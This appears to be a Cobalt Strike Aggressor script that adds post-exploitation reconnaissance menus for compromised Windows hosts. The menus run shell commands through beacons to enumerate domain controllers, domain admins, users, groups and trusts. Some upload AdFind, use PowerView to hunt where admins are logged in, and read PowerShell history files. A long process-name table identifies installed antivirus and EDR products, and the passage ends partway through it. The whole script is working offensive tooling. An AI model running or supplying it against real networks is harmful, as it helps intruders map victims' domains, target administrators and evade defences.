menu "Information Gathering" {
		
	menu "Common Workgroup Commands" {
		item "systeminfo" {
			blog($1, "\c9=========== systeminfo ==========");
			$bid = $1['@'];
			bshell($bid, "systeminfo");
		}
		item "whoami /all" {
			blog($1, "\c9=========== whoami /all ==========");
			$bid = $1['@'];
			bshell($bid, "whoami /all");
		}
		item "ipconfig /all" {
			blog($1, "\c9=========== ipconfig /all ==========");
			$bid = $1['@'];
			bshell($bid, "ipconfig /all");
		}
		menu "Check network information"	{
			item "View the routing table" {
				blog($1, "\c9=========== View routing table ==========");
				$bid = $1['@'];
				bshell($bid, "route print");
			}
			item "View ARP Cache" {
				blog($1, "\c9=========== View ARP Cache ==========");
				$bid = $1['@'];
				bshell($bid, "arp -A");
			}
			item "View Hosts File" {
				blog($1, "\c9=========== View Hosts File ==========");
				bshell($1, "type C:\\Windows\\System32\\drivers\\etc\\hosts");
			}
			item "View DNS Cache" {
				blog($1, "\c9=========== View DNS Cache ==========");
				bshell($1, "ipconfig /displaydns");
			}
			item "Tracert Routing Tracking" {
				blog($1, "\c9=========== Tracert Routing Tracking ==========");
				prompt_text("The ip or domain to be traced：", "", lambda({ bshell(@ids, "tracert $1");  }, @ids => $1));
			}		
		}	
		item "View User Information" {
			blog($1, "\c9=========== View User Information ==========");
			$bid = $1['@'];
			bshell($bid, "net user");
		}		
		item "View Installer and version information" {
			blog($1, "\c9=========== View Installer and version information ==========");
			$bid = $1['@'];
			bshell($bid, "wmic product get name,version");
		}
		item "View Installed patches" {
			blog($1, "\c9=========== View Installed patches ==========");
			$bid = $1['@'];
			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
		}
		item "View Running processes and paths" {
			blog($1, "\c9=========== View Running processes and paths ==========");
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,executablepath,commandline");
		}
		item " View process details" {
			blog($1, "\c9===========  View process details ==========");
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,commandline,processid /value");
		}
		item " View Services" {
			blog($1, "\c9===========  View Services ==========");
			$bid = $1['@'];
			bshell($bid, "wmic service list brief");
		}
		item " View Firewall Configuration" {
			blog($1, "\c9===========  View Firewall Configuration ==========");
			$bid = $1['@'];
			bshell($bid, "netsh firewall show config");
		}
		item " View scheduled tasks" {
			blog($1, "\c9===========  View scheduled tasks ==========");
			$bid = $1['@'];
			bshell($bid, "schtasks.exe");
		}
		item " View scheduled tasks details" {
			blog($1, "\c9===========  View scheduled tasks details ==========");
			$bid = $1['@'];
			bshell($bid, "schtasks /query /fo LIST /v");
		}
		item " View startup program information" {
			blog($1, "\c9===========  View startup program information ==========");
			$bid = $1['@'];
			bshell($bid, "wmic startup get command,caption");
		}
		item " View Online Users" {
			blog($1, "\c9===========  View Online Users ==========");
			$bid = $1['@'];
			bshell($bid, "query user || qwinsta");
		}
		item " View Power On Time" {
			blog($1, "\c9===========  View Power On Time ==========");
			$bid = $1['@'];
			bshell($bid, "net statistics workstation");
		}
		item "Viewpowershell v5 History Command" {
			blog($1, "\c9=========== Viewpowershell v5 History Command ==========");
			$bid = $1['@'];
			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
		}
		item "View recently used items" {
			blog($1, "\c9=========== View recently used items ==========");
			$bid = $1['@'];
			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
		}
		item "ViewSMB pointing path" {
			blog($1, "\c9=========== ViewSMB pointing path ==========");
			$bid = $1['@'];
			bshell($bid, "wmic share get name,path");
		}
	}

	menu "AD Enumeration" {
		menu "AdFind (Querying information in the domain)" {
			item "Upload AdFind" {
				blog($1, "\c9=========== Upload AdFind ==========");
				$bid = $1;
				$dialog = dialog("Upload AdFind", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &AdFind_upload);
				dialog_description($dialog,"AdFind is used to query information in the domain. Project Address：http://www.joeware.net/freetools/tools/adfind/index.htm");
				drow_text($dialog, "UploadPath",  "Upload Paths: ");
				dbutton_action($dialog, "Upload ");
				dialog_show($dialog);
			}
			sub AdFind_upload {
				bcd($bid, $3['UploadPath']);
				bupload($bid, script_resource("/scripts/InfoCollect/AdFind.exe"));
			}
			item "List domain controller names" {
				blog($1, "\c9=========== List domain controller names ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc dclist");
			}
			item "Query online computers in domain" {
				blog($1, "\c9=========== Query online computers in domain ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active");
			}
			item "Query online computers in domain(Displays name and operating system)" {
				blog($1, "\c9=========== Query online computers in domain(Displays name and operating system) ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
			}
			item "Query all computers in the current domain" {
				blog($1, "\c9=========== Query all computers in the current domain ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
			}
			item "Query all computers in the current domain(Display only the name and operating system)" {
				blog($1, "\c9=========== Query all computers in the current domain(Display only the name and operating system) ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
			}
			item "Query all users in the domain" {
				blog($1, "\c9=========== Query all users in the domain ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -users name");
			}
			item "Query all GPOs" {
				blog($1, "\c9=========== Query all GPOs ==========");
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc gpodmp");
			}
			item "Delete AdFind" {
				blog($1, "\c9=========== Delete AdFind ==========");
				$bid = $1['@'];
				bshell($bid, "del /f /s /q AdFind.exe");
			}
		}
		item "View Domain Information"{
			blog($1, "\c9=========== View Domain Information ==========");
			bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
			bpowerpick($1, "Get-NetForest");
		}
		menu "Find a Domain Controller"{
			item "View Primary Domain Controller" {
				blog($1, "\c9=========== View Primary Domain Controller ==========");
				$bid = $1['@'];
				bshell($bid, "netdom query pdc");
			}
			item "View Domain Controller List" {
				blog($1, "\c9=========== View Domain Controller List ==========");
				$bid = $1['@'];
				bshell($bid, "net group \"Domain Controllers\" /domain");
			}		
			item "Get domain controller details" {
				blog($1, "\c9=========== Get domain controller details ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetDomainController");
			}
			item "Net time Find a Domain" {
				blog($1, "\c9=========== Net time Find a Domain ==========");
				bshell($1, "net time /domain");
			}
			item "Nslookup Find a Domain Controller" {
				blog($1, "\c9=========== Nslookup Find a Domain Controller ==========");
				prompt_text("Enter the domain name:", "xstark.sec", lambda({ bshell(@ids, "Nslookup -type=SRV _ldap._tcp $1"); }, @ids => $1));
			}
			item "Nltest Find a Domain Controller" {
				blog($1, "\c9=========== Nltest Find a Domain Controller ==========");
				prompt_text("Enter the domain name:", "xstark.sec", lambda({ bshell(@ids, "nltest /DCLIST:$1"); }, @ids => $1));
			}
		}

		menu "Query Domain Administrator" {
			item "Find Domain Admins" {
				blog($1, "\c9=========== Find Domain Admins ==========");
				$bid = $1['@'];
				bshell($bid, 'net group "domain admins" /domain');
			}
			item "Find Enterprise Administrators" {
				blog($1, "\c9=========== Find Enterprise Administrators ==========");
				$bid = $1['@'];
				bshell($bid, 'net group "enterprise admins" /domain');
			}
			item "View localgroup Admins" {
				blog($1, "\c9=========== View localgroup Admins ==========");
				$bid = $1['@'];
				bshell($bid, "net localgroup administrators /domain");
			}
		}

		menu "Querying users in the domain" {
			item "Query the user information of the specified domain" {
				blog($1, "\c9=========== Query the user information of the specified domain ==========");
				prompt_text("Enter the domain user name", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
			}
			item "Query current domain users SID" {
				blog($1, "\c9=========== Query Domain Userss SID ==========");
				$bid = $1['@'];
				bshell($bid, "whoami /user");
			}
			item "View All domain users" {
				blog($1, "\c9=========== View All domain users ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
				bpowerpick($1, "Get-NetUser | select name");
			}
			item "View all user groups in the domain" {
				blog($1, "\c9=========== View all user groups in the domain ==========");
				$bid = $1['@'];
				bshell($bid, "net group /domain");
			}
			item "Count the number of users in the domain" {
				blog($1, "\c9=========== Count the number of users in the domain ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
				bpowerpick($1, "Get-NetUser | select name | measure | findstr Count");
			}
			item "Exporting domain users to File" {
				blog($1, "\c9=========== Exporting domain users to File ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
				bpowerpick($1, "Get-NetUser | select name > domain_user.txt");
				blog($1, "Export the user details in the domain to the current directory of domain_user.txt File!");
			}
			item "Export domain user details to File" {
				blog($1, "\c9=========== Export domain user details to File ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
				bpowerpick($1, "Get-NetUser > domain_user_info.txt");
				blog($1, "Export the users in the domain to the current directory of domain_user_info.txt File!");
			}
			item "Query which domain groups the specified domain users are in" {
				blog($1, "\c9=========== Query which domain groups the specified domain users are in ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/PowerView.ps1"));
				prompt_text("Enter the domain user to query:", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
			}				
		}
		menu "Query hosts in the domain"{
			item "View a list of all domain member computers" {
				blog($1, "\c9=========== View a list of all domain member computers ==========");
				$bid = $1['@'];
				bshell($bid, "net group \"domain computers\" /domain");
			}
			item "View all computers in the domain" {
				blog($1, "\c9=========== View all computers in the domain ==========");
				prompt_text("Enter the host name", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
			}		
			item "Count the number of hosts in the domain" {
				blog($1, "\c9=========== Count the number of hosts in the domain ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetComputer | measure | findstr Count");
			}
			item "View hosts in the domain" {
				blog($1, "\c9=========== View hosts in the domain ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetComputer");
			}
			item "Exporting domain hosts to File" {
				blog($1, "\c9=========== Exporting domain hosts to File ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetComputer > domain_computer.txt");
				blog($1, "Export the hosts in the domain to the current directory in domain_computer.txt File!");
			}
			item "Query the specified host" {
				blog($1, "\c9=========== Query the specified host ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				prompt_text("Enter the characters to be queried:", "admin", lambda({ bpowerpick(@ids, "Get-NetComputer \*$1\*"); }, @ids => $1));
			}
		}
		menu "Query groups within the domain"{
			item "Query group name in the domain(All groups)" {
				blog($1, "\c9=========== Query group name in the domain(All groups) ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetGroup");
			}
			item "Query group name in the domain(Global Groups, General Groups)" {
				blog($1, "\c9=========== Query groups(Global Groups, General Groups) ==========");
				bshell($1, "net group /domain");
			}
			item "Exporting domain groups to File" {
				blog($1, "\c9=========== Exporting Domain Groups to File ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				bpowerpick($1, "Get-NetGroup > domain_group.txt");
				blog($1, "Export the groups in the domain to File!");
			}
			item "Query a specified domain group" {
				blog($1, "\c9=========== Query a specified domain group ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				prompt_text("Enter the characters to be queried:", "admin", lambda({ bpowerpick(@ids, "Get-NetGroup \*$1\*"); }, @ids => $1));
			}
			item "Query which domain groups the specified domain users are in" {
				blog($1, "\c9=========== Query which domain groups the specified domain users are in ==========");
				bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
				prompt_text("Enter the domain user to query：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
			}
			item "Query which users are in the specified group" {
				blog($1, "\c9=========== Query which users are in the specified group ==========");
				prompt_text("Enter the name of the group to be queried:", "domain admins", lambda({ bpowerpick(@ids, "net group \"$1\" /domain"); }, @ids => $1));
			}
		}				
		menu "Find a domain user or domain host (domain manager)" {
			item "Query the currently logged-in host of the specified user" {
				blog($1, "\c9=========== Query the currently logged-in host of the specified user ==========");
				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
				prompt_text("Enter the specified user:", "administrator", lambda({ bpowerpick(@ids,"Invoke-UserHunter -UserName \"$1\"");}, @ids => $1));
			}
			item "Query the currently logged-in user of the specified host" {
				blog($1, "\c9=========== Query the currently logged-in user of the specified host ==========");
				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
				prompt_text("Enter the specified host:", "win7", lambda({ bpowerpick(@ids,"Invoke-UserHunter -ComputerName \"$1\"");}, @ids => $1));
			}
		}
		menu "DnsQuery (Domain Controller)" {
			item "Querying the main domain controller" {
				blog($1, "\c9=========== Query Master Domain Controller ==========");
				bshell($1, "netdom query pdc");
			}
			item "Query DC (dsquery)" {
				blog($1, "\c9=========== Query Domain Controller ==========");
				bshell($1, "dsquery server");
			}
			item "Query Domain Users" {
				blog($1, "\c9=========== Query Domain Users ==========");
				bshell($1, "dsquery user");
			}
			item "Query Domain Host" {
				blog($1, "\c9=========== Query Domain Host ==========");
				bshell($1, "dsquery computer");
			}
			item "Query Domain Group" {
				blog($1, "\c9=========== Query Domain Group ==========");
				bshell($1, "dsquery group");
			}
			item "Search for organizational units" {
				blog($1, "\c9=========== Search for organizational units ==========");
				bshell($1, "dsquery ou");
			}
			item "Search Site" {
				blog($1, "\c9=========== Search Site ==========");
				bshell($1, "dsquery site");
			}
			item "Query Partition" {
				blog($1, "\c9=========== Query Partition ==========");
				bshell($1, "dsquery partition");
			}
		}

		item "View Current Login Domain" {
			blog($1, "\c9=========== View Current Login Domain ==========");
			$bid = $1['@'];
			bshell($bid, "net config workstation");
		}
		item "Query Domain Organization Unit" {
			blog($1, "\c9=========== Query Domain's organizational unit ==========");
			bpowershell_import($1, script_resource("/scripts/InfoCollect/Powerview.ps1"));
			bpowerpick($1, "Get-NetOU");
		}		
		item "Obtaining Domain Trust Relationships" {
			blog($1, "\c9=========== Obtaining Domain Trust Relationships ==========");
			$bid = $1['@'];
			bshell($bid, "nltest /domain_trusts");
		}	
		item "Get Domain Password Policy" {
			blog($1, "\c9=========== Get Domain Password Policy ==========");
			$bid = $1['@'];
			bshell($bid, "net accounts /domain");
		}
		item "Query Domain DNS Records" {
			blog($1, "\c9=========== Query Domain DNS Records ==========");
	        $bid = $1['@'];
	        $Dialog = dialog("Query DomainDNSRecords",%(domain => "xstark.sec",bid => $bid),&query_dns);
	        dialog_description($Dialog, "Query Domain's DNSRecords");
	        drow_text($Dialog, "domain", "Domain Name: ");
	        dbutton_action($Dialog, "Identify");
	        dialog_show($Dialog);
		}
		sub query_dns{
			bpowershell_import($bid, script_resource("/scripts/InfoCollect/Powerview.ps1"));
			bpowerpick($bid, "Get-DNSRecord  -ZoneName $3['domain'] | select name,data");
			bpowerpick($bid, "Get-DNSRecord  -ZoneName $3['domain'] | select name,data > dns.txt");
		}
	}
	
	separator();
	menu "Host antivirus information query" {
		item "AvSearch WMIC" {
			blog($1, "\c9=========== AvSearch（Antivirus information） ==========");
			bshell($1,"wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName,productState,pathToSignedProductExe | findstr /V /B /C:displayName || echo No Antivirus installed");
		}

						item "AntiVirusCheck(status bar)" {
				%sr = %(
				"360tray.exe" => "360 Security Guard - Real-time Protection",
				"360safe.exe": => "360 Security Guard - Main Program",
				"ZhuDongFangYu.exe" => "360 Security Guard - Active Defense",
				"360sd.exe" => "360 antivirus",
				"a2guard.exe" => "a-squared antivirus",
				"ad-watch.exe" => "Lavasoft Antivirus",
				"cleaner8.exe" => "The Cleaner Antivirus",
				"vba32lder.exe" => "vb32 antivirus",
				"MongoosaGUI.exe" => "Mongoosa antivirus",
				"CorantiControlCenter32.exe" => "Coranti2012 antivirus",
				"F-PROT.exe" => "F-Prot AntiVirus",
				"CMCTrayIcon.exe" => "CMC antivirus",
				"K7TSecurity.exe" => "K7 antivirus",
				"UnThreat.exe" => "UnThreat antivirus",
				"CKSoftShiedAntivirus4.exe" => "Shield Antivirus",
				"AVWatchService.exe" => "VIRUSfighter antivirus",
				"ArcaTasksService.exe" => "ArcaVir antivirus",
				"iptray.exe" => "Immunet antivirus",
				"PSafeSysTray.exe" => "PSafe antivirus",
				"nspupsvc.exe" => "nProtect antivirus",
				"SpywareTerminatorShield.exe" => "SpywareTerminator Anti-Spyware",
				"BKavService.exe" => "Bkav antivirus",
				"MsMpEng.exe" => "Windows Defender",
				"SBAMSvc.exe" => "VIPRE",
				"ccSvcHst.exe" => "Norton antivirus",
				"f-secure.exe" => "Iceland",
				"avp.exe" => "Kaspersky",
				"KvMonXP.exe" => "Jiangmin Antivirus",
				"RavMonD.exe" => "Rising Antivirus",
				"Mcshield.exe" => "McAfee",
				"Tbmon.exe" => "McAfee",
				"Frameworkservice.exe" => "McAfee",
				"egui.exe" => "ESET NOD32",
				"ekrn.exe" => "ESET NOD32",
				"eguiProxy.exe" => "ESET NOD32",
				"kxetray.exe" => "Kingsoft Antivirus",
				"knsdtray.exe" => "Kansdtray Antivirus",
				"TMBMSRV.exe" => "Trend Antivirus",
				"avcenter.exe" => "Avira(Little Red Umbrella)",
				"avguard.exe" => "Avira(Little Red Umbrella)",
				"avgnt.exe" => "Avira (Little Red Umbrella)",
				"sched.exe" => "Avira(Little Red Umbrella)",
				"ashDisp.exe" => "Avast Internet Security",
				"rtvscan.exe" => "Norton Antivirus",
				"ccapp.exe" => "Symantec Norton",
				"NPFMntor.exe" => "Norton antivirus software",
				"ccSetMgr.exe" => "Symantec",
				"ccRegVfy.exe" => "Norton Antivirus",
				"ksafe.exe" => "Jinshan Guardian",
				"QQPCRTP.exe" => "QQ Computer Manager",
				"avgwdsvc.exe" => "AVG antivirus",
				"QUHLPSVC.exe" => "QUICK HEAL antivirus",
				"mssecess.exe" => "Microsoft Antivirus",
				"SavProgress.exe" => "Sophos antivirus",
				"SophosUI.exe" => "Sophos antivirus",
				"SophosFS.exe" => "Sophos antivirus",
				"SophosHealth.exe" => "Sophos Antivirus",
				"SophosSafestore64.exe" => "Sophos Antivirus",
				"SophosCleanM.exe" => "Sophos Antivirus",
				"fsavgui.exe" => "F-Secure antivirus",
				"vsserv.exe" => "Bitdefender",
				"remupd.exe" => "Panda Guardian",
				"FortiTray.exe" => "FortiTray",
				"safedog.exe" => "safedog",
				"parmor.exe" => "Trojan mark star",
				"Iparmor.exe.exe" => "Trojan mark star",
				"beikesan.exe" => "Beikesan Cloud Security",
				"KSWebShield.exe" => "Jinshan WebShield",
				"TrojanHunter.exe" => "Trojan Hunter",
				"GG.exe" => "Giant Shield Online Game Security Shield",
				"adam.exe" => "Green Eagle Security Wizard",
				"AST.exe" => "Super Patrol",
				"ananwidget.exe" => "Mozhe Security Expert",
				"AVK.exe" => "AntiVirusKit",
				"avg.exe" => "AVG Anti-Virus",
				"spidernt.exe" => "Dr. web",
				"avgaurd.exe" => "Avira Antivir",
				"vsmon.exe" => "Zone Alarm",
				"cpf.exe" => "Comodo",
				"outpost.exe" => "Outpost Firewall",
				"rfwmain.exe" => "Rising Firewall",
				"kpfwtray.exe" => "Jinshan Internet Dart",
				"FYFireWall.exe" => "FYFireWall",
				"MPMon.exe" => "Micropoint active defense",
				"pfw.exe" => "Skynet Firewall",
				"BaiduSdSvc.exe" => "Baidu antivirus-service process",
				"BaiduSdTray.exe" => "Baidu Antivirus-Tray Process",
				"BaiduSd.exe" => "Baidu antivirus-main program",
				"SafeDogGuardCenter.exe" => "Safe Dog",
				"safedogupdatecenter.exe" => "safedog",
				"safedogguardcenter.exe" => "safedog",
				"SafeDogSiteIIS.exe" => "Safe Dog",
				"SafeDogTray.exe" => "Safe Dog",
				"SafeDogServerUI.exe" => "SafeDog",
				"D_Safe_Manage.exe" => "D Shield",
				"d_manage.exe" => "D Shield",
				"yunsuo_agent_service.exe" => "cloud lock",
				"yunsuo_agent_daemon.exe" => "cloud lock",
				"HwsPanel.exe" => "Guardian",
				"hws_ui.exe" => "Guardian",
				"hws.exe" => "Guardian God",
				"hwsd.exe" => "Guardian God",
				"HipsTray.exe" => "Tinder",
				"HipsDaemon.exe" => "Tinder",
				"wsctrl.exe" => "Tinder",
				"usysdiag.exe" => "Tinder",
				"SPHINX.exe" => "SPHINX Firewall",
				"bddownloader.exe" => "Baidu Guardian",
				"baiduansvx.exe" => "Baidu Guardian-Main Process",
				"AvastUI.exe" => "Avast!5 main program",
				"emet_agent.exe" => "EMET",
				"emet_service.exe" => "EMET",
				"firesvc.exe" => "McAfee",
				"firetray.exe" => "McAfee",
				"hipsvc.exe" => "McAfee",
				"mfevtps.exe" => "McAfee",
				"mcafeefire.exe" => "McAfee",
				"scan32.exe" => "McAfee",
				"shstat.exe" => "McAfee",
				"vstskmgr.exe" => "McAfee",
				"engineserver.exe" => "McAfee",
				"mfeann.exe" => "McAfee",
				"mcscript.exe" => "McAfee",
				"updaterui.exe" => "McAfee",
				"udaterui.exe" => "McAfee",
				"naprdmgr.exe" => "McAfee",
				"cleanup.exe" => "McAfee",
				"cmdagent.exe" => "McAfee",
				"frminst.exe" => "McAfee",
				"mcscript_inuse.exe" => "McAfee",
				"mctray.exe" => "McAfee",
				"_avp32.exe" => "Kaspersky",
				"_avpcc.exe" => "Kaspersky",
				"_avpm.exe" => "Kaspersky",
				"aAvgApi.exe" => "AVG",
				"ackwin32.exe" => "Known anti-software process, the name is not included yet",
				"alertsvc.exe" => "Norton AntiVirus",
				"alogserv.exe" => "McAfee VirusScan",
				"anti-trojan.exe" => "Anti-Trojan Elite",
				"arr.exe" => "Application Request Route",
				"atguard.exe" => "AntiVir",
				"atupdater.exe" => "Known anti-software process, the name is not included yet",
				"atwatch.exe" => "Mustek",
				"au.exe" => "NSIS",
				"aupdate.exe" => "Symantec",
				"auto-protect.nav80try.exe" => "Known anti-software process, the name is not included yet",
				"autodown.exe" => "AntiVirus AutoUpdater",
				"avconsol.exe" => "McAfee",
				"avgcc32.exe" => "AVG",
				"avgctrl.exe" => "AVG",
				"avgemc.exe" => "AVG",
				"avgrsx.exe" => "AVG",
				"avgserv.exe" => "AVG",
				"avgserv9.exe" => "AVG",
				"avgw.exe" => "AVG",
				"avkpop.exe" => "G DATA SOFTWARE AG",
				"avkserv.exe" => "G DATA SOFTWARE AG",
				"avkservice.exe" => "G DATA SOFTWARE AG",
				"avkwctl9.exe" => "G DATA SOFTWARE AG",
				"avltmain.exe" => "Panda Software Application",
				"avnt.exe" => "H+BEDV Datentechnik GmbH",
				"avp32.exe" => "Kaspersky Anti-Virus",
				"avpcc.exe" => "Kaspersky AntiVirus",
				"avpdos32.exe" => "Kaspersky AntiVirus",
				"avpm.exe" => "Kaspersky AntiVirus",
				"avptc32.exe" => "Kaspersky AntiVirus",
				"avpupd.exe" => "Kaspersky AntiVirus",
				"avsyncr.exe" => "McAfee",
				"avwin.exe" => "H+BEDV",
				"bargains.exe" => "Exact Advertising SpyWare",
				"beagle.exe" => "Avast",
				"blackd.exe" => "BlackICE",
				"blackice.exe" => "BlackICE",
				"blink.exe" => "micromedia",
				"blss.exe" => "CBlaster",
				"bootwarn.exe" => "Symantec",
				"bpc.exe" => "Grokster",
				"brasil.exe" => "Exact Advertising",
				"ccevtmgr.exe" => "Norton Internet Security",
				"cdp.exe" => "CyberLink Corp.",
				"cfd.exe" => "Motive Communications",
				"cfgwiz.exe" => "Norton AntiVirus",
				"claw95.exe" => "Known anti-software process, the name is not included yet",
				"claw95cf.exe" => "Known anti-software process, the name is not included yet",
				"clean.exe" => "windows rogue software cleaning master",
				"cleaner.exe" => "windows rogue software cleaning master",
				"cleaner3.exe" => "windows rogue software cleaning master",
				"cleanpc.exe" => "windows rogue software cleaning master",
				"cpd.exe" => "McAfee",
				"ctrl.exe" => "Known anti-software process, the name is not included yet",
				"cv.exe" => "Known anti-software process, the name is not included yet",
				"defalert.exe" => "Symantec",
				"defscangui.exe" => "Symantec",
				"defwatch.exe" => "Norton Antivirus",
				"doors.exe" => "Known anti-software process, the name is not included yet",
				"dpf.exe" => "Known anti-software process, the name is not included yet",
				"dpps2.exe" => "PanicWare",
				"dssagent.exe" => "Broderbund",
				"ecengine.exe" => "Known anti-software process, the name is not included yet",
				"emsw.exe" => "Alset Inc",
				"ent.exe" => "Known anti-software process, the name is not included yet",
				"espwatch.exe" => "Known anti-software process, the name is not included yet",
				"ethereal.exe" => "RationalClearCase",
				"exe.avxw.exe" => "Known anti-software process, the name is not included yet",
				"expert.exe" => "Known anti-software process, the name is not included yet",
				"f-prot95.exe" => "Known anti-software process, the name is not included yet",
				"fameh32.exe" => "F-Secure",
				"fast.exe" => "FastUsr",
				"fch32.exe" => "F-Secure",
				"fih32.exe" => "F-Secure",
				"findviru.exe" => "F-Secure",
				"firewall.exe" => "Ashampoo Software",
				"fnrb32.exe" => "F-Secure",
				"fp-win.exe" => "F-Prot Antivirus OnDemand",
				"fsaa.exe" => "F-Secure",
				"fsav.exe" => "F-Secure",
				"fsav32.exe" => "F-Secure",
				"fsav530stbyb.exe" => "F-Secure",
				"fsav530wtbyb.exe" => "F-Secure",
				"fsav95.exe" => "F-Secure",
				"fsgk32.exe" => "F-Secure",
				"fsm32.exe" => "F-Secure",
				"fsma32.exe" => "F-Secure",
				"fsmb32.exe" => "F-Secure",
				"gbmenu.exe" => "Known anti-software process, the name is not included yet",
				"guard.exe" => "ewido",
				"guarddog.exe" => "ewido",
				"htlog.exe" => "Known anti-software process, the name is not included yet",
				"htpatch.exe" => "Silicon Integrated Systems Corporation",
				"hwpe.exe" => "Known anti-software process, the name is not included yet",
				"iamapp.exe" => "Symantec",
				"iamserv.exe" => "Symantec",
				"iamstats.exe" => "Symantec",
				"iedriver.exe" => "Urlblaze.com",
				"iface.exe" => "Panda Antivirus Module",
				"infus.exe" => "Infus Dialer",
				"infwin.exe" => "Msviewparasite",
				"intdel.exe" => "Inet Delivery",
				"intren.exe" => "Known anti-software process, the name is not included yet",
				"jammer.exe" => "Known anti-software process, the name is not included yet",
				"kavpf.exe" => "Kapersky",
				"kazza.exe" => "Kapersky",
				"keenvalue.exe" => "EUNIVERSE INC",
				"launcher.exe" => "Intercort Systems",
				"ldpro.exe" => "Known anti-software process, the name is not included yet",
				"ldscan.exe" => "Windows Trojans Inspector",
				"localnet.exe" => "Known anti-software process, the name is not included yet",
				"luall.exe" => "Symantec",
				"luau.exe" => "Symantec",
				"lucomserver.exe" => "Norton",
				"mcagent.exe" => "McAfee",
				"mcmnhdlr.exe" => "McAfee",
				"mctool.exe" => "McAfee",
				"mcupdate.exe" => "McAfee",
				"mcvsrte.exe" => "McAfee",
				"mcvsshld.exe" => "McAfee",
				"mfin32.exe" => "MyFreeInternetUpdate",
				"mfw2en.exe" => "MyFreeInternetUpdate",
				"mfweng3.02d30.exe" => "MyFreeInternetUpdate",
				"mgavrtcl.exe" => "McAfee",
				"mgavrte.exe" => "McAfee",
				"mghtml.exe" => "McAfee",
				"mgui.exe" => "BullGuard",
				"minilog.exe" => "Zone Labs Inc",
				"mmod.exe" => "EzulaInc",
				"mostat.exe" => "WurldMediaInc",
				"mpfagent.exe" => "McAfee",
				"mpfservice.exe" => "McAfee",
				"mpftray.exe" => "McAfee",
				"mscache.exe" => "Integrated Search Technologies Spyware",
				"mscman.exe" => "Odysseus Marketing Inc",
				"msmgt.exe" => "Total Velocity Spyware",
				"msvxd.exe" => "W32/Datom-A",
				"mwatch.exe" => "Known anti-software process, the name is not included yet",
				"nav.exe" => "Reuters Limited",
				"navapsvc.exe" => "Norton AntiVirus",
				"navapw32.exe" => "Norton AntiVirus",
				"navw32.exe" => "Norton Antivirus",
				"ndd32.exe" => "Norton Disk Doctor",
				"neowatchlog.exe" => "Known anti-software process, the name is not included yet",
				"netutils.exe" => "Known anti-software process, the name is not included yet",
				"nisserv.exe" => "Norton",
				"nisum.exe" => "Norton",
				"nmain.exe" => "Norton",
				"nod32.exe" => "ESET Smart Security",
				"norton_internet_secu_3.0_407.exe" => "Known anti-software process, the name is not included yet",
				"notstart.exe" => "Known anti-software process, the name is not included yet",
				"nprotect.exe" => "Symantec",
				"npscheck.exe" => "Norton",
				"npssvc.exe" => "Norton",
				"ntrtscan.exe" => "Trend Antivirus Application",
				"nui.exe" => "Known anti-software process, the name is not included yet",
				"otfix.exe" => "Known anti-software process, the name is not included yet",
				"outpostinstall.exe" => "Outpost",
				"patch.exe" => "Trend Micro",
				"pavw.exe" => "Known anti-software process, the name is not included yet",
				"pcscan.exe" => "Trend Micro",
				"pdsetup.exe" => "Known anti-software process, the name is not included yet",
				"persfw.exe" => "Tiny Personal Firewall",
				"pgmonitr.exe" => "PromulGate SpyWare",
				"pingscan.exe" => "Known anti-software process, the name is not included yet",
				"platin.exe" => "Known anti-software process, the name is not included yet",
				"pop3trap.exe" => "PC-cillin",
				"poproxy.exe" => "NortonAntiVirus",
				"popscan.exe" => "Known anti-software process, the name is not included yet",
				"powerscan.exe" => "Integrated Search Technologies",
				"ppinupdt.exe" => "Known anti-software process, the name is not included yet",
				"pptbc.exe" => "Known anti-software process, the name is not included yet",
				"ppvstop.exe" => "Known anti-software process, the name is not included yet",
				"prizesurfer.exe" => "Prizesurfer",
				"prmt.exe" => "OpiStat",
				"prmvr.exe" => "Addtomi",
				"processmonitor.exe" => "Sysinternals",
				"proport.exe" => "Known anti-software process, the name is not included yet",
